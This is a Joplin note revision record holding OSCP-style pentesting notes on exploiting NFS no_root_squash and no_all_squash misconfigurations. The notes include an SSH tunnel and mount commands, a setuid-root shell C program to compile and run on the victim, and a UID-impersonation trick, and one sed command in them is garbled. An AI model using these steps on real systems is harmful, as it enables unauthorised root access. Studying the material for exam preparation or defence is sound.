id: ed9f99b3bf0e416087773e5829be1718
parent_id: 
item_type: 1
item_id: 5c154102202a4bc2810ada55f25852e7
item_updated_time: 1661091619800
title_diff: "[{\"diffs\":[[1,\"NFS Vulns\\\r\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":10}]"
body_diff: "[{\"diffs\":[[1,\"<ins>Vulnerabilities</ins>\\\n\\\n[https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no\\\\_root\\\\_squash-misconfiguration-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)\\\n\\\nRead the /etc/exports file, if you find some directory that is configured as no\\\\_root\\\\_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine.\\\n\\\n**no\\\\_root\\\\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.\\\n\\\n**no\\\\_all\\\\_squash**: This is similar to no\\\\_root\\\\_squash option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no\\\\_all\\\\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.\\\n\\\n<ins>NFS; no\\\\_root\\\\_squash, insecure, rw</ins>\\\n\\\nIf /etc/exports have a line e.g.\\\n\\\n> /srv/pelota 192.168.42.0/24(insecure,rw)\\\n> /srv/pelota 127.0.0.1/32(no\\\\_root\\\\_squash,insecure,rw)\\\n\\\nThen NFS is being exported and you have ssh access to the machine. You can use your attacker machine (login as root) to run:\\\n\\\n> ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049\\\n> mount -t nfs 127.0.0.1:/srv/pelota my_share\\\n> cd my_share\\\n> cat > shell.c<<EOF\\\n> #include &lt;unistd.h&gt;\\\n> int main(){\\\n> setuid(0);\\\n> setgid(0);\\\n> system(\\\"/bin/bash\\\");\\\n> }\\\n> EOF\\\n> gcc shell.c -o shell\\\n> chmod u+s shell\\\n\\\nNow inside a ssh session on the victim machine i.e. 192.168.42.32 in this case\\\n\\\n> cd /srv/pelota\\\n> ./shell\\\n> \\\n> Use 'id' to identify what user you are\\\n\\\n<ins>Example of Vuln config; OSCP EXAM HAPPENED</ins>\\\n\\\nIf you wish to use NSE scripts:nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254\\\n\\\n![7a58718293ff72b88d3e48b60dfc46d7.png](:/a6a3e955d5ca4466a074924b94657fda)\\\n\\\nThis case -- /home is being shared, and can be accessed by mounting it on our kali machine.\\\n\\\nTo do so:\\\n\\\n> mkdir home;\\\n> \\\n> sudo mount -I nolock $IP/home ~/home/;\\\n\\\n- -nolock will disable file locking\\\n\\\nIf we try to view files within that mounted folder, there won't be any permissions granted\\\n\\\nWhat we can do is to replicate the user by creating a user with the same UUID, su to that user and access the file\\\n\\\n> `sudo adduser pwn; sudo sed 0u 0e 's/$Created\\\\_UUID/$permission\\\\_UUID/g' /etc/passwd; su pwn; cat $file`\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":2465}]"
metadata_diff: {"new":{"id":"5c154102202a4bc2810ada55f25852e7","parent_id":"27b595c9aae647aba407fed241a81f90","latitude":"1.36730000","longitude":"103.80140000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":0,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-08-21T14:20:48.672Z
created_time: 2022-08-21T14:20:48.672Z
type_: 13